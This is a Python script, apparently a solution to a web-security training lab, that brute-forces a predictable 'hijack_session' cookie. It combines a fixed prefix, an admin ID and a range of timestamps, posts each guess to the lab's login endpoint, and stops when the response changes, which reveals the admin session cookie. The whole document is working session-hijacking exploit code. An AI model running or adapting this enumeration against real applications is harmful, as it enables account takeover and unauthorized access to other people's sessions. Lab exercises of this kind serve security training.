import requests
import json
import time

URL = "http://web0x01.hbtn/api/a1/hijack_session/login"

HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Accept": "/",
    "Content-Type": "application/json",
    "Origin": "http://web0x01.hbtn/",
    "Referer": "http://web0x01.hbtn/a1/hijack_session/"
}

DATA = {
    "email": "s@gmail.com",
    "password": "dsfs"
}

SESSION_COOKIE = "QJpcG7ULpwaZsQbQ4XngdXzFC1UcRdoevm4HKVblc9c.f4sGDIavh0kEOIou21mV-tCSlOM"

FIXED_PREFIX = "69db2d7f-a86a-4a55-a99"
ADMIN_UUID = 8418802

START_TS = 17686730477
END_TS   = 17686730765

baseline_len = None

for ts in range(START_TS, END_TS + 1):
    hijack_value = f"{FIXED_PREFIX}-{ADMIN_UUID}-{ts}"

    cookies = {
        "hijack_session": hijack_value,
        "session": SESSION_COOKIE
    }

    r = requests.post(
        URL,
        headers=HEADERS,
        cookies=cookies,
        data=json.dumps(DATA),
        timeout=5
    )

    body = r.text.strip()
    length = len(body)

    if baseline_len is None:
        baseline_len = length

    # Fərqli cavab tutulan kimi
    if length != baseline_len or "Try Harder" not in body or r.status_code != 200:
        print("\n[!!!] ADMIN SESSION TAPILDI")
        print(f"UUID: {ADMIN_UUID}")
        print(f"Timestamp: {ts}")
        print(f"Status code: {r.status_code}")
        print(f"Response length: {length}")
        print(f"Response body:\n{body}")
        print(f"\nCOOKIE:")
        print(f"hijack_session={hijack_value}")
        break

    print(f"[-] ts={ts} | len={length}")

    time.sleep(0.05)
